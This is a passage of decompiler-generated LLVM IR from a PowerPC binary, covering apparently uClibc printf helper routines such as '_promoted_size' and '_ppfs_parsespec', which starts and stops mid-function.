  %v2_1000ed48 = add i32 %v1_1000ed44, %v1_1000eb38
  store i32 %v2_1000ed48, i32* %r9.global-to-local, align 4
  %v1_1000ed4c = add i32 %v2_1000ed48, -8
  %v2_1000ed4c = inttoptr i32 %v1_1000ed4c to i32*
  %v3_1000ed4c = load i32, i32* %v2_1000ed4c, align 4
  store i32 %v3_1000ed4c, i32* %r0.global-to-local, align 4
  store i32 %v3_1000ed4c, i32* %v2_1000eb3c, align 4
  %v0_1000ed54.pre = load i32, i32* @r3, align 4
  %v1_1000ed58.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000ed54

dec_label_pc_1000ed54:                            ; preds = %dec_label_pc_1000ed34, %dec_label_pc_1000ed40
  %v1_1000ed58 = phi i32 [ -2147483648, %dec_label_pc_1000ed34 ], [ %v1_1000ed58.pre, %dec_label_pc_1000ed40 ]
  %v1_1000ed70 = phi i32 [ %v0_1000eb34, %dec_label_pc_1000ed34 ], [ %v0_1000ed54.pre, %dec_label_pc_1000ed40 ]
  %v1_1000ed54 = add i32 %v1_1000ed70, 4
  %v2_1000ed54 = inttoptr i32 %v1_1000ed54 to i32*
  %v3_1000ed54 = load i32, i32* %v2_1000ed54, align 4
  store i32 %v3_1000ed54, i32* %r0.global-to-local, align 4
  %v3_1000ed58 = icmp sgt i32 %v3_1000ed54, %v1_1000ed58
  %v4_1000ed58 = icmp eq i32 %v3_1000ed54, %v1_1000ed58
  store i1 %v3_1000ed58, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000ed58, label %dec_label_pc_1000ed60, label %dec_label_pc_1000ed74

dec_label_pc_1000ed60:                            ; preds = %dec_label_pc_1000ed54
  %v1_1000ed60 = add i32 %v1_1000ed70, 37
  %v2_1000ed60 = inttoptr i32 %v1_1000ed60 to i8*
  %v3_1000ed60 = load i8, i8* %v2_1000ed60, align 1
  %v4_1000ed60 = zext i8 %v3_1000ed60 to i32
  %v1_1000ed64 = mul nuw nsw i32 %v4_1000ed60, 8
  %v1_1000ed68 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ed68 = add i32 %v1_1000ed64, %v1_1000ed68
  store i32 %v2_1000ed68, i32* %r9.global-to-local, align 4
  %v1_1000ed6c = add i32 %v2_1000ed68, -8
  %v2_1000ed6c = inttoptr i32 %v1_1000ed6c to i32*
  %v3_1000ed6c = load i32, i32* %v2_1000ed6c, align 4
  store i32 %v3_1000ed6c, i32* %r0.global-to-local, align 4
  store i32 %v3_1000ed6c, i32* %v2_1000ed54, align 4
  %v0_1000ed74.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000ed74

dec_label_pc_1000ed74:                            ; preds = %dec_label_pc_1000ed20, %dec_label_pc_1000ed24.preheader, %dec_label_pc_1000ed54, %dec_label_pc_1000ed60
  %v0_1000ed74 = phi i32 [ %v1_1000ed70, %dec_label_pc_1000ed54 ], [ %v0_1000ed74.pre, %dec_label_pc_1000ed60 ], [ %v0_1000ed245, %dec_label_pc_1000ed24.preheader ], [ %v0_1000ed24, %dec_label_pc_1000ed20 ]
  %v1_1000ed74 = add i32 %v0_1000ed74, 8
  %v2_1000ed74 = inttoptr i32 %v1_1000ed74 to i32*
  %v3_1000ed74 = load i32, i32* %v2_1000ed74, align 4
  store i32 %v3_1000ed74, i32* %r11.global-to-local, align 4
  %v2_1000ed78 = icmp sgt i32 %v3_1000ed74, 0
  store i1 %v2_1000ed78, i1* %cr7_gt.global-to-local, align 1
  %v0_1000ed7c = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1000ed74, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1000ed7c)
  %v0_1000ed80 = load i32, i32* @r3, align 4
  %v1_1000ed80 = add i32 %v0_1000ed80, 16
  %v2_1000ed80 = inttoptr i32 %v1_1000ed80 to i32*
  %v3_1000ed80 = load i32, i32* %v2_1000ed80, align 4
  store i32 %v3_1000ed80, i32* %r0.global-to-local, align 4
  %v0_1000ed84 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ed84 = sub i32 0, %v0_1000ed84
  store i32 %v1_1000ed84, i32* %r11.global-to-local, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1000ed8c = add i32 %v0_1000ed80, 8
  %v3_1000ed8c = inttoptr i32 %v2_1000ed8c to i32*
  store i32 %v1_1000ed84, i32* %v3_1000ed8c, align 4
  %v0_1000ed90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ed90 = or i32 %v0_1000ed90, 8
  store i32 %v1_1000ed90, i32* %r0.global-to-local, align 4
  %v0_1000ed94 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ed94 = load i32, i32* @r3, align 4
  %v2_1000ed94 = add i32 %v1_1000ed94, 20
  %v3_1000ed94 = inttoptr i32 %v2_1000ed94 to i32*
  store i32 %v0_1000ed94, i32* %v3_1000ed94, align 4
  %v1_1000ed98 = call i32 @__asm_rlwinm(i32 %v1_1000ed90, i32 0, i32 0, i32 30)
  store i32 %v1_1000ed98, i32* %r0.global-to-local, align 4
  %v1_1000ed9c = load i32, i32* @r3, align 4
  %v2_1000ed9c = add i32 %v1_1000ed9c, 16
  %v3_1000ed9c = inttoptr i32 %v2_1000ed9c to i32*
  store i32 %v1_1000ed98, i32* %v3_1000ed9c, align 4
  %v0_1000eda0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000eda0

; uselistorder directives
  uselistorder i32 %v3_1000ed54, { 1, 0, 2 }
  uselistorder i32 %v1_1000ed58, { 1, 0 }
  uselistorder i32 %v3_1000ed24, { 1, 0, 2 }
  uselistorder i32 %v1_1000ed20, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1000ed24, { 0, 2, 1 }
  uselistorder i32 %v4_1000ec9c, { 1, 0, 2 }
  uselistorder i32 %v1_1000ec5c, { 1, 0 }
  uselistorder i32 %v1_1000ec54, { 2, 0, 1 }
  uselistorder i32 %v1_1000ec00, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1000ebf4, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1000ebec, { 1, 0 }
  uselistorder i32 %v2_1000ed00, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1000ed245, { 1, 0, 2 }
  uselistorder i32 %v3_1000eb94, { 1, 0, 2 }
  uselistorder i32 %v2_1000ebc4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1000eb3c, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1000eb34, { 1, 0, 2 }
  uselistorder i32 %v0_1000eb34, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_gt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 0, 19, 9, 10, 11, 12, 1, 14, 15, 16, 17, 18 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 88, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed74, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ed54, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed20, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ed14, { 1, 0 }
  uselistorder label %dec_label_pc_1000ece4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000ec98, { 1, 0 }
  uselistorder label %dec_label_pc_1000ec84, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebec, { 1, 0 }
  uselistorder label %dec_label_pc_1000ed24.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb94, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb88, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1000edb0

dec_label_pc_1000edb0:                            ; preds = %dec_label_pc_1000edb0, %entry
  %v0_1000edb0 = phi i32 [ ptrtoint (i32* @global_var_10019614.599 to i32), %entry ], [ %v1_1000edb0, %dec_label_pc_1000edb0 ]
  %v1_1000edb0 = add i32 %v0_1000edb0, -2
  %v2_1000edb0 = inttoptr i32 %v1_1000edb0 to i16*
  %v3_1000edb0 = load i16, i16* %v2_1000edb0, align 2
  %v4_1000edb0 = sext i16 %v3_1000edb0 to i32
  %v4_1000edb4 = icmp eq i32 %v4_1000edb0, %arg1
  %v3_1000edb8.not = icmp ule i32 %v1_1000edb0, ptrtoint (i32* @global_var_100195fc.600 to i32)
  %brmerge = or i1 %v4_1000edb4, %v3_1000edb8.not
  br i1 %brmerge, label %dec_label_pc_1000edc4, label %dec_label_pc_1000edb0

dec_label_pc_1000edc4:                            ; preds = %dec_label_pc_1000edb0
  %v2_1000edcc = sub i32 %v1_1000edb0, ptrtoint (i32* @global_var_100195fc.600 to i32)
  %v1_1000edd4 = udiv i32 %v2_1000edcc, 2
  %v2_1000edd4 = and i32 %v2_1000edcc, -2147483648
  %v3_1000edd4 = or i32 %v1_1000edd4, %v2_1000edd4
  %v2_1000eddc = add i32 %v3_1000edd4, ptrtoint (i32* @global_var_10019614.599 to i32)
  %v3_1000eddc = inttoptr i32 %v2_1000eddc to i8*
  %v4_1000eddc = load i8, i8* %v3_1000eddc, align 1
  %v5_1000eddc = zext i8 %v4_1000eddc to i32
  ret i32 %v5_1000eddc

; uselistorder directives
  uselistorder i32 %v2_1000edcc, { 1, 0 }
  uselistorder i32 %v1_1000edb0, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_100195fc.600 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10019614.599 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1000ede4 = load i32, i32* @lr, align 4
  store i32 %v0_1000ede4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1000edfc = add i32 %tmp, 16
  %v2_1000edfc = inttoptr i32 %v1_1000edfc to i32*
  %v3_1000edfc = load i32, i32* %v2_1000edfc, align 4
  %v1_1000ee04 = and i32 %v3_1000edfc, 128
  store i32 %v1_1000ee04, i32* %r6.global-to-local, align 4
  %v3_1000ee04 = icmp eq i32 %v1_1000ee04, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1000ee18 = add i32 %tmp, 24
  %v2_1000ee18 = inttoptr i32 %v1_1000ee18 to i32*
  %v3_1000ee18 = load i32, i32* %v2_1000ee18, align 4
  store i32 %v3_1000ee18, i32* @r26, align 4
  br i1 %v3_1000ee04, label %dec_label_pc_1000ee20, label %dec_label_pc_1000ee38

dec_label_pc_1000ee20:                            ; preds = %entry
  %v2_1000ee20 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1000ee8c

dec_label_pc_1000ee30:                            ; preds = %dec_label_pc_1000f060
  %v1_1000ee30 = add i32 %v0_1000f030, 1
  store i32 %v1_1000ee30, i32* @r30, align 4
  br label %dec_label_pc_1000f078

dec_label_pc_1000ee38:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1000ee3c = load i32, i32* %arg1, align 4
  store i32 %v2_1000ee3c, i32* %r8.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000ee48 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000ee48, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000ee4c

dec_label_pc_1000ee4c:                            ; preds = %dec_label_pc_1000ee7c.dec_label_pc_1000ee4c_crit_edge, %dec_label_pc_1000ee38
  %v0_1000ee54 = phi i32 [ %v0_1000ee54.pre, %dec_label_pc_1000ee7c.dec_label_pc_1000ee4c_crit_edge ], [ %v2_1000ee3c, %dec_label_pc_1000ee38 ]
  %v0_1000ee50 = phi i32 [ %v0_1000ee50.pre, %dec_label_pc_1000ee7c.dec_label_pc_1000ee4c_crit_edge ], [ %v2_1000ee48, %dec_label_pc_1000ee38 ]
  %v0_1000ee58 = phi i32 [ %v0_1000ee4c.pre, %dec_label_pc_1000ee7c.dec_label_pc_1000ee4c_crit_edge ], [ 0, %dec_label_pc_1000ee38 ]
  %v1_1000ee4c = mul i32 %v0_1000ee58, 4
  %v2_1000ee50 = add i32 %v0_1000ee58, %v0_1000ee50
  store i32 %v2_1000ee50, i32* %r9.global-to-local, align 4
  %v2_1000ee54 = add i32 %v1_1000ee4c, %v0_1000ee54
  store i32 %v2_1000ee54, i32* %r11.global-to-local, align 4
  %v1_1000ee58 = add i32 %v0_1000ee58, 1
  store i32 %v1_1000ee58, i32* %r10.global-to-local, align 4
  %v1_1000ee5c = add i32 %v2_1000ee54, -4
  %v2_1000ee5c = inttoptr i32 %v1_1000ee5c to i32*
  %v3_1000ee5c = load i32, i32* %v2_1000ee5c, align 4
  store i32 %v3_1000ee5c, i32* %r0.global-to-local, align 4
  %v1_1000ee60 = trunc i32 %v3_1000ee5c to i8
  %v3_1000ee60 = add i32 %v2_1000ee50, 24
  %v4_1000ee60 = inttoptr i32 %v3_1000ee60 to i8*
  store i8 %v1_1000ee60, i8* %v4_1000ee60, align 1
  %v0_1000ee64 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee64 = urem i32 %v0_1000ee64, 256
  store i32 %v1_1000ee64, i32* %r0.global-to-local, align 4
  %v0_1000ee6c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ee6c = add i32 %v0_1000ee6c, -4
  %v2_1000ee6c = inttoptr i32 %v1_1000ee6c to i32*
  %v3_1000ee6c = load i32, i32* %v2_1000ee6c, align 4
  store i32 %v3_1000ee6c, i32* %r9.global-to-local, align 4
  %v4_1000ee70 = icmp eq i32 %v1_1000ee64, %v3_1000ee6c
  br i1 %v4_1000ee70, label %dec_label_pc_1000ee78, label %dec_label_pc_1000f2e8

dec_label_pc_1000ee78:                            ; preds = %dec_label_pc_1000ee4c
  %v3_1000ee68 = icmp eq i32 %v1_1000ee64, 0
  br i1 %v3_1000ee68, label %dec_label_pc_1000ee80, label %dec_label_pc_1000ee7c

dec_label_pc_1000ee7c:                            ; preds = %dec_label_pc_1000ee78
  %v0_1000ee7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ee7c = add i32 %v0_1000ee7c, -1
  store i32 %v1_1000ee7c, i32* %ctr.global-to-local, align 4
  %v2_1000ee7c = icmp eq i32 %v1_1000ee7c, 0
  br i1 %v2_1000ee7c, label %dec_label_pc_1000ee80, label %dec_label_pc_1000ee7c.dec_label_pc_1000ee4c_crit_edge

dec_label_pc_1000ee7c.dec_label_pc_1000ee4c_crit_edge: ; preds = %dec_label_pc_1000ee7c
  %v0_1000ee4c.pre = load i32, i32* %r10.global-to-local, align 4
  %v0_1000ee50.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1000ee54.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000ee4c

dec_label_pc_1000ee80:                            ; preds = %dec_label_pc_1000ee7c, %dec_label_pc_1000ee78
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000ee84 = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1000ee8c

dec_label_pc_1000ee8c:                            ; preds = %dec_label_pc_1000ee20, %dec_label_pc_1000ee80
  %v2_1000ee9c.pre-phi = phi i32 [ %.pre, %dec_label_pc_1000ee20 ], [ %v2_1000ee48, %dec_label_pc_1000ee80 ]
  %storemerge3 = phi i32 [ %v2_1000ee20, %dec_label_pc_1000ee20 ], [ %v2_1000ee84, %dec_label_pc_1000ee80 ]
  store i32 %storemerge3, i32* %r10.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  store i32 268566528, i32* @r27, align 4
  store i32 %v2_1000ee9c.pre-phi, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eeac

dec_label_pc_1000eea8:                            ; preds = %dec_label_pc_1000efb8, %dec_label_pc_1000f03c
  %v0_1000eea8 = phi i32 [ %v1_1000f03c, %dec_label_pc_1000f03c ], [ %v0_1000efa0, %dec_label_pc_1000efb8 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1000f03c ], [ %stack_var_-84.2, %dec_label_pc_1000efb8 ]
  store i32 %v0_1000eea8, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000eeac

dec_label_pc_1000eeac:                            ; preds = %dec_label_pc_1000ee8c, %dec_label_pc_1000eea8
  %v0_1000eec0 = phi i32 [ %storemerge3, %dec_label_pc_1000ee8c ], [ %v0_1000eea8, %dec_label_pc_1000eea8 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1000ee8c ], [ %stack_var_-84.0, %dec_label_pc_1000eea8 ]
  %v1_1000eeac = inttoptr i32 %v0_1000eec0 to i8*
  %v2_1000eeac = load i8, i8* %v1_1000eeac, align 1
  %v3_1000eeac = zext i8 %v2_1000eeac to i32
  store i32 %v3_1000eeac, i32* %r0.global-to-local, align 4
  store i32 %v0_1000eec0, i32* @r30, align 4
  %v3_1000eeb4 = icmp eq i8 %v2_1000eeac, 42
  br i1 %v3_1000eeb4, label %dec_label_pc_1000eebc, label %dec_label_pc_1000eecc

dec_label_pc_1000eebc:                            ; preds = %dec_label_pc_1000eeac
  %v0_1000eebc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000eebc = mul i32 %v0_1000eebc, -4
  store i32 %v1_1000eebc, i32* %r0.global-to-local, align 4
  %v1_1000eec0 = add i32 %v0_1000eec0, 1
  store i32 %v1_1000eec0, i32* @r30, align 4
  %v0_1000eec4 = load i32, i32* @r1, align 4
  %v2_1000eec4 = add i32 %v0_1000eec4, %v1_1000eebc
  store i32 %v2_1000eec4, i32* %r9.global-to-local, align 4
  %v0_1000eec8 = load i32, i32* @r29, align 4
  %v2_1000eec8 = add i32 %v2_1000eec4, 8
  %v3_1000eec8 = inttoptr i32 %v2_1000eec8 to i32*
  store i32 %v0_1000eec8, i32* %v3_1000eec8, align 4
  %v0_1000eee4.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000eecc

dec_label_pc_1000eecc:                            ; preds = %dec_label_pc_1000eeac, %dec_label_pc_1000eebc
  %v0_1000eee4.pre = phi i32 [ %v0_1000eec0, %dec_label_pc_1000eeac ], [ %v0_1000eee4.pre.pre, %dec_label_pc_1000eebc ]
  %v3_1000eecc = load i32, i32* @global_var_1002ab70, align 4
  store i32 %v3_1000eecc, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eee4

dec_label_pc_1000eed8:                            ; preds = %dec_label_pc_1000eee4
  %v2_1000eee8 = icmp sgt i32 %v0_1000ef30, 4094
  br i1 %v2_1000eee8, label %dec_label_pc_1000eee0, label %dec_label_pc_1000eedc

dec_label_pc_1000eedc:                            ; preds = %dec_label_pc_1000eed8
  %v1_1000eedc = add i32 %v2_1000eefc, -48
  store i32 %v1_1000eedc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000eee0

dec_label_pc_1000eee0:                            ; preds = %dec_label_pc_1000eed8, %dec_label_pc_1000eedc
  %v0_1000eee815 = phi i32 [ %v0_1000ef30, %dec_label_pc_1000eed8 ], [ %v1_1000eedc, %dec_label_pc_1000eedc ]
  %v1_1000eee0 = add i32 %v0_1000ef60, 1
  store i32 %v1_1000eee0, i32* @r30, align 4
  br label %dec_label_pc_1000eee4

dec_label_pc_1000eee4:                            ; preds = %dec_label_pc_1000eecc, %dec_label_pc_1000eee0
  %v0_1000ef30 = phi i32 [ 0, %dec_label_pc_1000eecc ], [ %v0_1000eee815, %dec_label_pc_1000eee0 ]
  %v0_1000ef60 = phi i32 [ %v0_1000eee4.pre, %dec_label_pc_1000eecc ], [ %v1_1000eee0, %dec_label_pc_1000eee0 ]
  %v1_1000eee4 = inttoptr i32 %v0_1000ef60 to i8*
  %v2_1000eee4 = load i8, i8* %v1_1000eee4, align 1
  %v3_1000eee4 = zext i8 %v2_1000eee4 to i32
  store i32 %v3_1000eee4, i32* %r11.global-to-local, align 4
  %v1_1000eeec = mul nuw nsw i32 %v3_1000eee4, 2
  store i32 %v1_1000eeec, i32* %r9.global-to-local, align 4
  %v2_1000eef0 = add i32 %v1_1000eeec, %v3_1000eecc
  %v3_1000eef0 = inttoptr i32 %v2_1000eef0 to i16*
  %v4_1000eef0 = load i16, i16* %v3_1000eef0, align 2
  %v5_1000eef0 = zext i16 %v4_1000eef0 to i32
  store i32 %v5_1000eef0, i32* %r0.global-to-local, align 4
  %v1_1000eef4 = mul i32 %v0_1000ef30, 10
  %v1_1000eef8 = and i32 %v5_1000eef0, 8
  store i32 %v1_1000eef8, i32* @r25, align 4
  %v3_1000eef8 = icmp eq i32 %v1_1000eef8, 0
  %v2_1000eefc = add i32 %v3_1000eee4, %v1_1000eef4
  store i32 %v2_1000eefc, i32* %r9.global-to-local, align 4
  br i1 %v3_1000eef8, label %dec_label_pc_1000ef04, label %dec_label_pc_1000eed8

dec_label_pc_1000ef04:                            ; preds = %dec_label_pc_1000eee4
  %v0_1000ef04 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000ef04 = add i32 %v0_1000ef04, -1
  %v2_1000ef04 = inttoptr i32 %v1_1000ef04 to i8*
  %v3_1000ef04 = load i8, i8* %v2_1000ef04, align 1
  %v4_1000ef04 = zext i8 %v3_1000ef04 to i32
  store i32 %v4_1000ef04, i32* %r0.global-to-local, align 4
  %v3_1000ef08 = icmp eq i8 %v3_1000ef04, 37
  br i1 %v3_1000ef08, label %dec_label_pc_1000ef10, label %dec_label_pc_1000efd8

dec_label_pc_1000ef10:                            ; preds = %dec_label_pc_1000ef04
  %v3_1000ef10 = icmp eq i8 %v2_1000eee4, 36
  br i1 %v3_1000ef10, label %dec_label_pc_1000ef18, label %dec_label_pc_1000ef4c

dec_label_pc_1000ef18:                            ; preds = %dec_label_pc_1000ef10
  %tmp58 = icmp slt i32 %v0_1000ef30, 1
  br i1 %tmp58, label %dec_label_pc_1000ef4c, label %dec_label_pc_1000ef20

dec_label_pc_1000ef20:                            ; preds = %dec_label_pc_1000ef18
  %v0_1000ef20 = load i32, i32* @r26, align 4
  %v3_1000ef20 = icmp eq i32 %v0_1000ef20, 0
  %v1_1000ef24 = add i32 %v0_1000ef60, 1
  store i32 %v1_1000ef24, i32* %r10.global-to-local, align 4
  br i1 %v3_1000ef20, label %dec_label_pc_1000f2e8, label %dec_label_pc_1000ef2c

dec_label_pc_1000ef2c:                            ; preds = %dec_label_pc_1000ef20
  %v3_1000ef2c = icmp sgt i32 %v0_1000ef30, %v0_1000ef20
  br i1 %v3_1000ef2c, label %dec_label_pc_1000ef38, label %dec_label_pc_1000ef44

dec_label_pc_1000ef38:                            ; preds = %dec_label_pc_1000ef2c
  store i32 %v0_1000ef30, i32* @r26, align 4
  br label %dec_label_pc_1000ef44

dec_label_pc_1000ef40:                            ; preds = %dec_label_pc_1000ef68, %dec_label_pc_1000ef60
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000ef44

dec_label_pc_1000ef44:                            ; preds = %dec_label_pc_1000ef2c, %dec_label_pc_1000ef38, %dec_label_pc_1000ef40
  %v0_1000ef44 = phi i32 [ %v0_1000ef04, %dec_label_pc_1000ef40 ], [ %v1_1000ef24, %dec_label_pc_1000ef38 ], [ %v1_1000ef24, %dec_label_pc_1000ef2c ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000ef40 ], [ %v0_1000ef30, %dec_label_pc_1000ef38 ], [ %v0_1000ef30, %dec_label_pc_1000ef2c ]
  br label %dec_label_pc_1000ef80

dec_label_pc_1000ef4c:                            ; preds = %dec_label_pc_1000ef10, %dec_label_pc_1000ef18
  %v0_1000ef4c = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000ef4c, 1
  br i1 %tmp59, label %dec_label_pc_1000ef60, label %dec_label_pc_1000ef54

dec_label_pc_1000ef54:                            ; preds = %dec_label_pc_1000ef4c
  %v3_1000ef54 = icmp eq i8 %v2_1000eee4, 109
  br i1 %v3_1000ef54, label %dec_label_pc_1000efd8, label %dec_label_pc_1000f2e8

dec_label_pc_1000ef60:                            ; preds = %dec_label_pc_1000ef4c
  %v3_1000ef60 = icmp ugt i32 %v0_1000ef60, %v0_1000ef04
  br i1 %v3_1000ef60, label %dec_label_pc_1000ef68, label %dec_label_pc_1000ef40

dec_label_pc_1000ef68:                            ; preds = %dec_label_pc_1000ef60
  %v1_1000ef68 = inttoptr i32 %v0_1000ef04 to i8*
  %v2_1000ef68 = load i8, i8* %v1_1000ef68, align 1
  %v3_1000ef68 = zext i8 %v2_1000ef68 to i32
  store i32 %v3_1000ef68, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ef04, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000ef74 = icmp eq i8 %v2_1000ef68, 48
  br i1 %v3_1000ef74, label %dec_label_pc_1000ef40, label %dec_label_pc_1000efdc

dec_label_pc_1000ef80:                            ; preds = %dec_label_pc_1000ef9c, %dec_label_pc_1000ef44
  %v0_1000efa0 = phi i32 [ %v0_1000ef44, %dec_label_pc_1000ef44 ], [ %v1_1000efa0, %dec_label_pc_1000ef9c ]
  store i32 %v0_1000efa0, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_100195f4.601 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000ef90 = inttoptr i32 %v0_1000efa0 to i8*
  br label %dec_label_pc_1000ef88

dec_label_pc_1000ef88:                            ; preds = %dec_label_pc_1000efa8, %dec_label_pc_1000ef80
  %v1_1000ef9c = phi i32 [ %v1_1000efac, %dec_label_pc_1000efa8 ], [ 1, %dec_label_pc_1000ef80 ]
  %v0_1000ef88 = phi i32 [ %v1_1000ef8c, %dec_label_pc_1000efa8 ], [ ptrtoint ([8 x i8]* @global_var_100195f4.601 to i32), %dec_label_pc_1000ef80 ]
  %v1_1000ef88 = inttoptr i32 %v0_1000ef88 to i8*
  %v2_1000ef88 = load i8, i8* %v1_1000ef88, align 1
  %v3_1000ef88 = zext i8 %v2_1000ef88 to i32
  store i32 %v3_1000ef88, i32* %r9.global-to-local, align 4
  %v1_1000ef8c = add i32 %v0_1000ef88, 1
  store i32 %v1_1000ef8c, i32* %r11.global-to-local, align 4
  %v2_1000ef90 = load i8, i8* %v1_1000ef90, align 1
  %v3_1000ef90 = zext i8 %v2_1000ef90 to i32
  store i32 %v3_1000ef90, i32* %r0.global-to-local, align 4
  %v4_1000ef94 = icmp eq i8 %v2_1000ef90, %v2_1000ef88
  br i1 %v4_1000ef94, label %dec_label_pc_1000ef9c, label %dec_label_pc_1000efa8

dec_label_pc_1000ef9c:                            ; preds = %dec_label_pc_1000ef88
  %v0_1000ef9c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000ef9c = or i32 %v0_1000ef9c, %v1_1000ef9c
  store i32 %v2_1000ef9c, i32* %r6.global-to-local, align 4
  %v1_1000efa0 = add i32 %v0_1000efa0, 1
  br label %dec_label_pc_1000ef80

dec_label_pc_1000efa8:                            ; preds = %dec_label_pc_1000ef88
  %v1_1000efa8 = inttoptr i32 %v1_1000ef8c to i8*
  %v2_1000efa8 = load i8, i8* %v1_1000efa8, align 1
  %v3_1000efa8 = zext i8 %v2_1000efa8 to i32
  store i32 %v3_1000efa8, i32* %r0.global-to-local, align 4
  %v1_1000efac = mul i32 %v1_1000ef9c, 2
  store i32 %v1_1000efac, i32* %r10.global-to-local, align 4
  %v3_1000efb0 = icmp eq i8 %v2_1000efa8, 0
